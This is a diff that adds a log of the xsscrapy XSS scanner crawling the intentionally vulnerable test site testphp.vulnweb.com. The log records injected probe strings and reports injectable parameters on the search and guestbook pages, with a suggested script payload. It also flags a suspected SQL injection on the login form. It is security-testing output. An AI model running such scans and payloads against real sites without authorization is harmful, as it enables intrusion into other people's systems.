@@ -1,0 +1,1282 @@
+2022-06-21 14:33:10 [scrapy.utils.log] INFO: Scrapy 2.6.1 started (bot: xsscrapy)
+2022-06-21 14:33:10 [scrapy.utils.log] INFO: Versions: lxml 4.8.0.0, libxml2 2.9.12, cssselect 1.1.0, parsel 1.6.0, w3lib 1.22.0, Twisted 22.4.0, Python 3.8.10 (tags/v3.8.10:3d8993a, May  3 2021, 11:48:03) [MSC v.1928 64 bit (AMD64)], pyOpenSSL 22.0.0 (OpenSSL 1.1.1n  15 Mar 2022), cryptography 36.0.2, Platform Windows-10-10.0.19043-SP0
+2022-06-21 14:33:10 [scrapy.crawler] INFO: Overridden settings:
+{'BOT_NAME': 'xsscrapy',
+ 'CONCURRENT_REQUESTS': '30',
+ 'DOWNLOAD_DELAY': '0',
+ 'DUPEFILTER_CLASS': 'xsscrapy.bloomfilters.BloomURLDupeFilter',
+ 'NEWSPIDER_MODULE': 'xsscrapy.spiders',
+ 'SPIDER_MODULES': ['xsscrapy.spiders']}
+2022-06-21 14:33:10 [scrapy.utils.log] DEBUG: Using reactor: twisted.internet.selectreactor.SelectReactor
+2022-06-21 14:33:10 [scrapy.extensions.telnet] INFO: Telnet Password: 9a49ddaca0030bb6
+2022-06-21 14:33:10 [scrapy.middleware] INFO: Enabled extensions:
+['scrapy.extensions.corestats.CoreStats',
+ 'scrapy.extensions.telnet.TelnetConsole',
+ 'scrapy.extensions.logstats.LogStats']
+2022-06-21 14:33:10 [scrapy.middleware] INFO: Enabled downloader middlewares:
+['xsscrapy.middlewares.InjectedDupeFilter',
+ 'xsscrapy.middlewares.RandomUserAgentMiddleware',
+ 'scrapy.downloadermiddlewares.httpauth.HttpAuthMiddleware',
+ 'scrapy.downloadermiddlewares.downloadtimeout.DownloadTimeoutMiddleware',
+ 'scrapy.downloadermiddlewares.defaultheaders.DefaultHeadersMiddleware',
+ 'scrapy.downloadermiddlewares.useragent.UserAgentMiddleware',
+ 'scrapy.downloadermiddlewares.retry.RetryMiddleware',
+ 'scrapy.downloadermiddlewares.redirect.MetaRefreshMiddleware',
+ 'scrapy.downloadermiddlewares.httpcompression.HttpCompressionMiddleware',
+ 'scrapy.downloadermiddlewares.redirect.RedirectMiddleware',
+ 'scrapy.downloadermiddlewares.cookies.CookiesMiddleware',
+ 'scrapy.downloadermiddlewares.httpproxy.HttpProxyMiddleware',
+ 'scrapy.downloadermiddlewares.stats.DownloaderStats']
+2022-06-21 14:33:10 [scrapy.middleware] INFO: Enabled spider middlewares:
+['scrapy.spidermiddlewares.httperror.HttpErrorMiddleware',
+ 'scrapy.spidermiddlewares.offsite.OffsiteMiddleware',
+ 'scrapy.spidermiddlewares.referer.RefererMiddleware',
+ 'scrapy.spidermiddlewares.urllength.UrlLengthMiddleware',
+ 'scrapy.spidermiddlewares.depth.DepthMiddleware']
+2022-06-21 14:33:10 [scrapy.middleware] INFO: Enabled item pipelines:
+['xsscrapy.pipelines.XSSCharFinder']
+2022-06-21 14:33:10 [scrapy.core.engine] INFO: Spider opened
+2022-06-21 14:33:10 [scrapy.extensions.logstats] INFO: Crawled 0 pages (at 0 pages/min), scraped 0 items (at 0 items/min)
+2022-06-21 14:33:10 [scrapy.extensions.telnet] INFO: Telnet console listening on 127.0.0.1:6023
+2022-06-21 14:33:11 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com> (referer: None)
+2022-06-21 14:33:11 [scrapy.spidermiddlewares.offsite] DEBUG: Filtered offsite request to 'www.acunetix.com': <GET https://www.acunetix.com/>
+2022-06-21 14:33:11 [scrapy.spidermiddlewares.offsite] DEBUG: Filtered offsite request to 'www.eclectasy.com': <GET http://www.eclectasy.com/Fractal-Explorer/index.html>
+2022-06-21 14:33:11 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/1zqjwu'%22()%7B%7D%3Cx%3E:1zqjwu;9
+2022-06-21 14:33:11 [xsscrapy] DEBUG: Sending payloaded form param searchFor to: http://testphp.vulnweb.com/search.php?test=query
+2022-06-21 14:33:11 [xsscrapy] DEBUG: Sending payloaded cookie header
+2022-06-21 14:33:11 [filelock] DEBUG: Attempting to acquire lock 2490274822224 on C:\Users\basst\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.8_qbz5n2kfra8p0\LocalCache\local-packages\Python38\site-packages\tldextract\.suffix_cache/publicsuffix.org-tlds\de84b5ca2167d4c83e38fb162f2e8738.tldextract.json.lock
+2022-06-21 14:33:11 [filelock] DEBUG: Lock 2490274822224 acquired on C:\Users\basst\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.8_qbz5n2kfra8p0\LocalCache\local-packages\Python38\site-packages\tldextract\.suffix_cache/publicsuffix.org-tlds\de84b5ca2167d4c83e38fb162f2e8738.tldextract.json.lock
+2022-06-21 14:33:11 [filelock] DEBUG: Attempting to release lock 2490274822224 on C:\Users\basst\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.8_qbz5n2kfra8p0\LocalCache\local-packages\Python38\site-packages\tldextract\.suffix_cache/publicsuffix.org-tlds\de84b5ca2167d4c83e38fb162f2e8738.tldextract.json.lock
+2022-06-21 14:33:11 [filelock] DEBUG: Lock 2490274822224 released on C:\Users\basst\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.8_qbz5n2kfra8p0\LocalCache\local-packages\Python38\site-packages\tldextract\.suffix_cache/publicsuffix.org-tlds\de84b5ca2167d4c83e38fb162f2e8738.tldextract.json.lock
+2022-06-21 14:33:11 [xsscrapy] DEBUG: Sending payloaded Referer header
+2022-06-21 14:33:11 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/hpp/> (referer: http://testphp.vulnweb.com)
+2022-06-21 14:33:11 [scrapy.spidermiddlewares.offsite] DEBUG: Filtered offsite request to 'blog.mindedsecurity.com': <GET http://blog.mindedsecurity.com/2009/05/client-side-http-parameter-pollution.html>
+2022-06-21 14:33:11 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/hpp/1zqjfb'%22()%7B%7D%3Cx%3E:1zqjfb;9
+2022-06-21 14:33:11 [xsscrapy] DEBUG: Sending payloaded cookie header
+2022-06-21 14:33:11 [xsscrapy] DEBUG: Sending payloaded Referer header
+2022-06-21 14:33:11 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/disclaimer.php> (referer: http://testphp.vulnweb.com)
+2022-06-21 14:33:11 [scrapy.downloadermiddlewares.redirect] DEBUG: Redirecting (302) to <GET http://testphp.vulnweb.com/login.php> from <GET http://testphp.vulnweb.com/userinfo.php>
+2022-06-21 14:33:11 [scrapy.core.engine] DEBUG: Crawled (404) <GET http://testphp.vulnweb.com/privacy.php> (referer: http://testphp.vulnweb.com)
+2022-06-21 14:33:11 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/> (referer: http://testphp.vulnweb.com)
+2022-06-21 14:33:11 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/AJAX/index.php> (referer: http://testphp.vulnweb.com)
+2022-06-21 14:33:11 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/cart.php> (referer: http://testphp.vulnweb.com)
+2022-06-21 14:33:11 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/login.php> (referer: http://testphp.vulnweb.com)
+2022-06-21 14:33:11 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/guestbook.php> (referer: http://testphp.vulnweb.com)
+2022-06-21 14:33:11 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/disclaimer.php/1zqjza'%22()%7B%7D%3Cx%3E:1zqjza;9
+2022-06-21 14:33:11 [xsscrapy] DEBUG: Sending payloaded cookie header
+2022-06-21 14:33:11 [xsscrapy] DEBUG: Sending payloaded Referer header
+2022-06-21 14:33:11 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/Mod_Rewrite_Shop/1zqjgg'%22()%7B%7D%3Cx%3E:1zqjgg;9
+2022-06-21 14:33:11 [xsscrapy] DEBUG: Sending payloaded cookie header
+2022-06-21 14:33:11 [xsscrapy] DEBUG: Sending payloaded Referer header
+2022-06-21 14:33:11 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/privacy.php/1zqjkt'%22()%7B%7D%3Cx%3E:1zqjkt;9
+2022-06-21 14:33:11 [xsscrapy] DEBUG: Sending payloaded cookie header
+2022-06-21 14:33:11 [xsscrapy] DEBUG: Sending payloaded Referer header
+2022-06-21 14:33:11 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/AJAX/index.php/1zqjpo'%22()%7B%7D%3Cx%3E:1zqjpo;9
+2022-06-21 14:33:11 [xsscrapy] DEBUG: Sending payloaded cookie header
+2022-06-21 14:33:11 [xsscrapy] DEBUG: Sending payloaded Referer header
+2022-06-21 14:33:11 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/cart.php/1zqjxu'%22()%7B%7D%3Cx%3E:1zqjxu;9
+2022-06-21 14:33:11 [xsscrapy] DEBUG: Sending payloaded cookie header
+2022-06-21 14:33:11 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/artists.php> (referer: http://testphp.vulnweb.com)
+2022-06-21 14:33:11 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/guestbook.php/1zqjdn'%22()%7B%7D%3Cx%3E:1zqjdn;9
+2022-06-21 14:33:11 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/categories.php> (referer: http://testphp.vulnweb.com)
+2022-06-21 14:33:11 [xsscrapy] DEBUG: Sending payloaded form param text to: http://testphp.vulnweb.com/guestbook.php
+2022-06-21 14:33:11 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/index.php> (referer: http://testphp.vulnweb.com)
+2022-06-21 14:33:11 [xsscrapy] DEBUG: Sending payloaded form param name to: http://testphp.vulnweb.com/guestbook.php
+2022-06-21 14:33:11 [scrapy.core.engine] DEBUG: Crawled (404) <GET http://testphp.vulnweb.com/robots.txt> (referer: http://testphp.vulnweb.com)
+2022-06-21 14:33:11 [xsscrapy] DEBUG: Sending payloaded cookie header
+2022-06-21 14:33:11 [scrapy.core.engine] DEBUG: Crawled (404) <GET http://testphp.vulnweb.com/requestXaX404> (referer: http://testphp.vulnweb.com)
+2022-06-21 14:33:11 [xsscrapy] DEBUG: Sending payloaded Referer header
+2022-06-21 14:33:11 [scrapy.core.engine] DEBUG: Crawled (404) <GET http://testphp.vulnweb.com/1zqjwu'%22()%7B%7D%3Cx%3E:1zqjwu;9> (referer: http://testphp.vulnweb.com)
+2022-06-21 14:33:11 [scrapy.core.engine] DEBUG: Crawled (200) <POST http://testphp.vulnweb.com/search.php?test=query> (referer: http://testphp.vulnweb.com)
+2022-06-21 14:33:11 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/login.php/1zqjyj'%22()%7B%7D%3Cx%3E:1zqjyj;9
+2022-06-21 14:33:11 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com> (referer: http://testphp.vulnweb.com)
+2022-06-21 14:33:11 [xsscrapy] DEBUG: Sending payloaded form param pass to: http://testphp.vulnweb.com/userinfo.php
+2022-06-21 14:33:11 [scrapy.spidermiddlewares.httperror] INFO: Ignoring response <404 http://testphp.vulnweb.com/1zqjwu'%22()%7B%7D%3Cx%3E:1zqjwu;9>: HTTP status code is not handled or not allowed
+2022-06-21 14:33:11 [xsscrapy] INFO:     URL: http://testphp.vulnweb.com
+2022-06-21 14:33:11 [xsscrapy] INFO:     Response URL: http://testphp.vulnweb.com/search.php?test=query
+2022-06-21 14:33:11 [xsscrapy] INFO:     POST URL: http://testphp.vulnweb.com/search.php?test=query
+2022-06-21 14:33:11 [xsscrapy] INFO:     Ongefilterde tekens: '"(){}<x>:/;
+2022-06-21 14:33:11 [xsscrapy] INFO:     Payload: 1zqjtx'"(){}<x>:/1zqjtx;9
+2022-06-21 14:33:11 [xsscrapy] INFO:     Type: form
+2022-06-21 14:33:11 [xsscrapy] INFO:     Injectiepunten: searchFor
+2022-06-21 14:33:11 [xsscrapy] INFO:     Mogelijke payloads: <svG onLoad=prompt(9)>
+2022-06-21 14:33:11 [xsscrapy] INFO:     Line: <h2 id='pagename'>searched for: 1zqjtx'"(){}<x>:/1zqjtx;9
+2022-06-21 14:33:11 [scrapy.core.scraper] DEBUG: Scraped from <200 http://testphp.vulnweb.com/search.php?test=query>
+
+
+2022-06-21 14:33:11 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com> (referer: 1zqjcy'"(){}<x>:/1zqjcy;9)
+2022-06-21 14:33:11 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/requestXaX404/1zqjsu'%22()%7B%7D%3Cx%3E:1zqjsu;9
+2022-06-21 14:33:11 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com. type = header, cookie
+
+
+2022-06-21 14:33:11 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/hpp/?pp=12> (referer: http://testphp.vulnweb.com/hpp/)
+2022-06-21 14:33:11 [xsscrapy] DEBUG: Sending payloaded cookie header
+2022-06-21 14:33:11 [scrapy.core.engine] DEBUG: Crawled (404) <GET http://testphp.vulnweb.com/hpp/1zqjfb'%22()%7B%7D%3Cx%3E:1zqjfb;9> (referer: http://testphp.vulnweb.com/hpp/)
+2022-06-21 14:33:11 [xsscrapy] DEBUG: Sending payloaded Referer header
+2022-06-21 14:33:11 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/hpp/> (referer: http://testphp.vulnweb.com/hpp/)
+2022-06-21 14:33:11 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/index.php/1zqjel'%22()%7B%7D%3Cx%3E:1zqjel;9
+2022-06-21 14:33:11 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/hpp/> (referer: 1zqjmi'"(){}<x>:/1zqjmi;9)
+2022-06-21 14:33:11 [xsscrapy] DEBUG: Sending payloaded cookie header
+2022-06-21 14:33:12 [scrapy.core.engine] DEBUG: Crawled (404) <GET http://testphp.vulnweb.com/disclaimer.php/1zqjza'%22()%7B%7D%3Cx%3E:1zqjza;9> (referer: http://testphp.vulnweb.com/disclaimer.php)
+2022-06-21 14:33:12 [xsscrapy] DEBUG: Sending payloaded Referer header
+2022-06-21 14:33:12 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/disclaimer.php> (referer: http://testphp.vulnweb.com/disclaimer.php)
+2022-06-21 14:33:12 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/disclaimer.php> (referer: 1zqjxr'"(){}<x>:/1zqjxr;9)
+2022-06-21 14:33:12 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com. type = header, Referer
+
+
+2022-06-21 14:33:12 [scrapy.spidermiddlewares.httperror] INFO: Ignoring response <404 http://testphp.vulnweb.com/hpp/1zqjfb'%22()%7B%7D%3Cx%3E:1zqjfb;9>: HTTP status code is not handled or not allowed
+2022-06-21 14:33:12 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/hpp/. type = header, cookie
+
+
+2022-06-21 14:33:12 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/hpp/. type = header, Referer
+
+
+2022-06-21 14:33:12 [scrapy.spidermiddlewares.httperror] INFO: Ignoring response <404 http://testphp.vulnweb.com/disclaimer.php/1zqjza'%22()%7B%7D%3Cx%3E:1zqjza;9>: HTTP status code is not handled or not allowed
+2022-06-21 14:33:12 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/disclaimer.php. type = header, cookie
+
+
+2022-06-21 14:33:12 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/color-printer/3/> (referer: http://testphp.vulnweb.com/Mod_Rewrite_Shop/)
+2022-06-21 14:33:12 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/> (referer: http://testphp.vulnweb.com/Mod_Rewrite_Shop/)
+2022-06-21 14:33:12 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/hpp/1zqjai'%22()%7B%7D%3Cx%3E:1zqjai;9/?pp=12
+2022-06-21 14:33:12 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/> (referer: http://testphp.vulnweb.com/Mod_Rewrite_Shop/)
+2022-06-21 14:33:12 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/disclaimer.php. type = header, Referer
+
+
+2022-06-21 14:33:12 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/hpp/?pp=1zqjbn'%22()%7B%7D%3Cx%3E:/1zqjbn;9
+2022-06-21 14:33:12 [scrapy.core.engine] DEBUG: Crawled (404) <GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/1zqjgg'%22()%7B%7D%3Cx%3E:1zqjgg;9> (referer: http://testphp.vulnweb.com/Mod_Rewrite_Shop/)
+2022-06-21 14:33:12 [xsscrapy] DEBUG: Sending payloaded cookie header
+2022-06-21 14:33:12 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/> (referer: http://testphp.vulnweb.com/Mod_Rewrite_Shop/)
+2022-06-21 14:33:12 [xsscrapy] DEBUG: Sending payloaded Referer header
+2022-06-21 14:33:12 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/> (referer: 1zqjcs'"(){}<x>:/1zqjcs;9)
+2022-06-21 14:33:12 [scrapy.core.engine] DEBUG: Crawled (404) <GET http://testphp.vulnweb.com/privacy.php/1zqjkt'%22()%7B%7D%3Cx%3E:1zqjkt;9> (referer: http://testphp.vulnweb.com/privacy.php)
+2022-06-21 14:33:12 [scrapy.core.engine] DEBUG: Crawled (404) <GET http://testphp.vulnweb.com/privacy.php> (referer: http://testphp.vulnweb.com/privacy.php)
+2022-06-21 14:33:12 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/categories.php/1zqjxy'%22()%7B%7D%3Cx%3E:1zqjxy;9
+2022-06-21 14:33:12 [scrapy.spidermiddlewares.httperror] INFO: Ignoring response <404 http://testphp.vulnweb.com/Mod_Rewrite_Shop/1zqjgg'%22()%7B%7D%3Cx%3E:1zqjgg;9>: HTTP status code is not handled or not allowed
+2022-06-21 14:33:12 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/Mod_Rewrite_Shop/. type = header, cookie
+
+
+2022-06-21 14:33:12 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/Mod_Rewrite_Shop/. type = header, Referer
+
+
+2022-06-21 14:33:12 [scrapy.core.engine] DEBUG: Crawled (404) <GET http://testphp.vulnweb.com/privacy.php> (referer: 1zqjny'"(){}<x>:/1zqjny;9)
+2022-06-21 14:33:12 [scrapy.spidermiddlewares.httperror] INFO: Ignoring response <404 http://testphp.vulnweb.com/privacy.php/1zqjkt'%22()%7B%7D%3Cx%3E:1zqjkt;9>: HTTP status code is not handled or not allowed
+2022-06-21 14:33:12 [scrapy.core.engine] DEBUG: Crawled (404) <GET http://testphp.vulnweb.com/AJAX/index.php/1zqjpo'%22()%7B%7D%3Cx%3E:1zqjpo;9> (referer: http://testphp.vulnweb.com/AJAX/index.php)
+2022-06-21 14:33:12 [scrapy.spidermiddlewares.httperror] INFO: Ignoring response <404 http://testphp.vulnweb.com/privacy.php>: HTTP status code is not handled or not allowed
+2022-06-21 14:33:12 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/AJAX/index.php> (referer: http://testphp.vulnweb.com/AJAX/index.php)
+2022-06-21 14:33:12 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/1zqjoo'%22()%7B%7D%3Cx%3E:1zqjoo;9
+2022-06-21 14:33:12 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/AJAX/index.php> (referer: 1zqjgv'"(){}<x>:/1zqjgv;9)
+2022-06-21 14:33:12 [xsscrapy] DEBUG: Sending payloaded cookie header
+2022-06-21 14:33:12 [scrapy.core.engine] DEBUG: Crawled (404) <GET http://testphp.vulnweb.com/cart.php/1zqjxu'%22()%7B%7D%3Cx%3E:1zqjxu;9> (referer: http://testphp.vulnweb.com/cart.php)
+2022-06-21 14:33:12 [xsscrapy] DEBUG: Sending payloaded Referer header
+2022-06-21 14:33:12 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/cart.php> (referer: http://testphp.vulnweb.com/cart.php)
+2022-06-21 14:33:12 [scrapy.core.engine] DEBUG: Crawled (404) <GET http://testphp.vulnweb.com/guestbook.php/1zqjdn'%22()%7B%7D%3Cx%3E:1zqjdn;9> (referer: http://testphp.vulnweb.com/guestbook.php)
+2022-06-21 14:33:12 [scrapy.spidermiddlewares.httperror] INFO: Ignoring response <404 http://testphp.vulnweb.com/privacy.php>: HTTP status code is not handled or not allowed
+2022-06-21 14:33:12 [scrapy.core.engine] DEBUG: Crawled (200) <POST http://testphp.vulnweb.com/guestbook.php> (referer: http://testphp.vulnweb.com/guestbook.php)
+2022-06-21 14:33:12 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/1zqjki'%22()%7B%7D%3Cx%3E:1zqjki;9
+2022-06-21 14:33:12 [scrapy.spidermiddlewares.httperror] INFO: Ignoring response <404 http://testphp.vulnweb.com/AJAX/index.php/1zqjpo'%22()%7B%7D%3Cx%3E:1zqjpo;9>: HTTP status code is not handled or not allowed
+2022-06-21 14:33:12 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/AJAX/index.php. type = header, cookie
+
+
+2022-06-21 14:33:12 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/AJAX/index.php. type = header, Referer
+
+
+2022-06-21 14:33:12 [scrapy.spidermiddlewares.httperror] INFO: Ignoring response <404 http://testphp.vulnweb.com/cart.php/1zqjxu'%22()%7B%7D%3Cx%3E:1zqjxu;9>: HTTP status code is not handled or not allowed
+2022-06-21 14:33:12 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/cart.php. type = header, cookie
+
+
+2022-06-21 14:33:12 [scrapy.core.engine] DEBUG: Crawled (200) <POST http://testphp.vulnweb.com/guestbook.php> (referer: http://testphp.vulnweb.com/guestbook.php)
+2022-06-21 14:33:12 [xsscrapy] DEBUG: Sending payloaded cookie header
+2022-06-21 14:33:12 [scrapy.spidermiddlewares.httperror] INFO: Ignoring response <404 http://testphp.vulnweb.com/guestbook.php/1zqjdn'%22()%7B%7D%3Cx%3E:1zqjdn;9>: HTTP status code is not handled or not allowed
+2022-06-21 14:33:12 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/guestbook.php> (referer: http://testphp.vulnweb.com/guestbook.php)
+2022-06-21 14:33:12 [xsscrapy] DEBUG: Sending payloaded Referer header
+2022-06-21 14:33:12 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/guestbook.php> (referer: 1zqjhf'"(){}<x>:/1zqjhf;9)
+2022-06-21 14:33:12 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/signup.php> (referer: http://testphp.vulnweb.com/login.php)
+2022-06-21 14:33:12 [xsscrapy] INFO:     URL: http://testphp.vulnweb.com/guestbook.php
+2022-06-21 14:33:12 [xsscrapy] INFO:     Response URL: http://testphp.vulnweb.com/guestbook.php
+2022-06-21 14:33:12 [xsscrapy] INFO:     POST URL: http://testphp.vulnweb.com/guestbook.php
+2022-06-21 14:33:12 [xsscrapy] INFO:     Ongefilterde tekens: '"(){}<x>:/;
+2022-06-21 14:33:12 [xsscrapy] INFO:     Payload: 1zqjmn'"(){}<x>:/1zqjmn;9
+2022-06-21 14:33:12 [xsscrapy] INFO:     Type: form
+2022-06-21 14:33:12 [xsscrapy] INFO:     Injectiepunten: text
+2022-06-21 14:33:12 [xsscrapy] INFO:     Mogelijke payloads: <svG onLoad=prompt(9)>
+2022-06-21 14:33:12 [xsscrapy] INFO:     Line: <img src="/images/remark.gif">&nbsp;&nbsp;1zqjmn'"(){}<x>:/1zqjmn;9
+2022-06-21 14:33:12 [scrapy.core.scraper] DEBUG: Scraped from <200 http://testphp.vulnweb.com/guestbook.php>
+
+
+2022-06-21 14:33:12 [scrapy.core.engine] DEBUG: Crawled (404) <GET http://testphp.vulnweb.com/login.php/1zqjyj'%22()%7B%7D%3Cx%3E:1zqjyj;9> (referer: http://testphp.vulnweb.com/login.php)
+2022-06-21 14:33:12 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/color-printer/3/1zqjwq'%22()%7B%7D%3Cx%3E:1zqjwq;9
+2022-06-21 14:33:12 [scrapy.core.engine] DEBUG: Crawled (302) <POST http://testphp.vulnweb.com/userinfo.php> (referer: http://testphp.vulnweb.com/login.php)
+2022-06-21 14:33:12 [xsscrapy] DEBUG: Sending payloaded cookie header
+2022-06-21 14:33:12 [scrapy.core.engine] DEBUG: Crawled (404) <GET http://testphp.vulnweb.com/requestXaX404/1zqjsu'%22()%7B%7D%3Cx%3E:1zqjsu;9> (referer: http://testphp.vulnweb.com/requestXaX404)
+2022-06-21 14:33:12 [xsscrapy] DEBUG: Sending payloaded Referer header
+2022-06-21 14:33:12 [xsscrapy] INFO:     URL: http://testphp.vulnweb.com/guestbook.php
+2022-06-21 14:33:12 [xsscrapy] INFO:     Response URL: http://testphp.vulnweb.com/guestbook.php
+2022-06-21 14:33:12 [xsscrapy] INFO:     POST URL: http://testphp.vulnweb.com/guestbook.php
+2022-06-21 14:33:12 [xsscrapy] INFO:     Ongefilterde tekens: '"(){}<x>:/;
+2022-06-21 14:33:12 [xsscrapy] INFO:     Payload: 1zqjmn'"(){}<x>:/1zqjmn;9
+2022-06-21 14:33:12 [xsscrapy] INFO:     Type: form
+2022-06-21 14:33:12 [xsscrapy] INFO:     Injectiepunten: name
+2022-06-21 14:33:12 [xsscrapy] INFO:     Mogelijke payloads: <svG onLoad=prompt(9)>
+2022-06-21 14:33:12 [xsscrapy] INFO:     Line: <strong>1zqjmn'"(){}<x>:/1zqjmn;9
+2022-06-21 14:33:12 [scrapy.core.scraper] DEBUG: Scraped from <200 http://testphp.vulnweb.com/guestbook.php>
+
+
+2022-06-21 14:33:12 [scrapy.core.engine] DEBUG: Crawled (404) <GET http://testphp.vulnweb.com/requestXaX404> (referer: http://testphp.vulnweb.com/requestXaX404)
+2022-06-21 14:33:12 [xsscrapy] DEBUG: Sending payloaded cookie header
+2022-06-21 14:33:12 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/guestbook.php. type = header, cookie
+
+
+2022-06-21 14:33:12 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/guestbook.php. type = header, Referer
+
+
+2022-06-21 14:33:12 [scrapy.spidermiddlewares.httperror] INFO: Ignoring response <404 http://testphp.vulnweb.com/login.php/1zqjyj'%22()%7B%7D%3Cx%3E:1zqjyj;9>: HTTP status code is not handled or not allowed
+2022-06-21 14:33:12 [scrapy.core.engine] DEBUG: Crawled (404) <GET http://testphp.vulnweb.com/requestXaX404> (referer: 1zqjot'"(){}<x>:/1zqjot;9)
+2022-06-21 14:33:12 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/signup.php/1zqjys'%22()%7B%7D%3Cx%3E:1zqjys;9
+2022-06-21 14:33:12 [xsscrapy] INFO:     URL: http://testphp.vulnweb.com/login.php
+2022-06-21 14:33:12 [xsscrapy] INFO:     Response URL: http://testphp.vulnweb.com/userinfo.php
+2022-06-21 14:33:12 [xsscrapy] INFO:     POST URL: http://testphp.vulnweb.com/userinfo.php
+2022-06-21 14:33:12 [xsscrapy] INFO:     Ongefilterde tekens: N/A
+2022-06-21 14:33:12 [xsscrapy] INFO:     Payload: 1zqjkp'"(){}<x>:/1zqjkp;9
+2022-06-21 14:33:12 [xsscrapy] INFO:     Type: form
+2022-06-21 14:33:12 [xsscrapy] INFO:     Injectiepunten: pass
+2022-06-21 14:33:12 [xsscrapy] INFO:     Line: Possible SQL injection error! Suspected DBMS: MySQL, regex used: Warning.*mysql_.*
+2022-06-21 14:33:12 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/userinfo.php. type = form, pass
+
+
+2022-06-21 14:33:12 [scrapy.spidermiddlewares.httperror] INFO: Ignoring response <404 http://testphp.vulnweb.com/requestXaX404/1zqjsu'%22()%7B%7D%3Cx%3E:1zqjsu;9>: HTTP status code is not handled or not allowed
+2022-06-21 14:33:12 [scrapy.core.engine] DEBUG: Crawled (404) <GET http://testphp.vulnweb.com/index.php/1zqjel'%22()%7B%7D%3Cx%3E:1zqjel;9> (referer: http://testphp.vulnweb.com/index.php)
